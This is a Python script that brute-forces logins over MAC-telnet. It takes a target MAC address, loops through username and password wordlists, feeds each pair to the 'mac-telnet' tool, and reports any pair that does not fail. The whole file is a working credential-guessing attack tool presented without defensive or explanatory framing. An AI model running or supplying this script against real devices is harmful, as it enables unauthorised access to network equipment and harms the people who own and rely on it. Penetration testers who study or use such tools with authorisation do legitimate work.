import subprocess
import sys
import os

USER_WORDLIST = "user.txt" #changehere
PASS_WORDLIST = "pass.txt" #changehere

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <MAC_ADDRESS>")
        sys.exit(1)

    mac_address = sys.argv[1]

    if not os.path.exists(USER_WORDLIST) or not os.path.exists(PASS_WORDLIST):
        print("[!] Wordlist file(s) not found.")
        sys.exit(1)

    print(f"[*] Starting MAC brute-force on {mac_address}...")
    print("[*] Trying...")

    with open(USER_WORDLIST, 'r') as user_file, open(PASS_WORDLIST, 'r') as pass_file:
        users = [u.strip() for u in user_file if u.strip()]
        passes = [p.strip() for p in pass_file if p.strip()]

    for user in users:
        for passwd in passes:
            try:
                input_data = f"{user}\n{passwd}\nquit\n"
                result = subprocess.run(
                    ["mac-telnet", mac_address],
                    input=input_data.encode(),
                    stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL,
                    timeout=5
                )

                if b"Login failed" not in result.stdout:
                    print(f"[+] SUCCESS! Username: {user} | Password: {passwd}")
                    sys.exit(0)

            except subprocess.TimeoutExpired:
                print(f"[!] Timeout with {user}:{passwd}")
            except Exception as e:
                print(f"[!] Error: {e}")

    print("[-] No valid credentials found.")

if __name__ == "__main__":
    main()
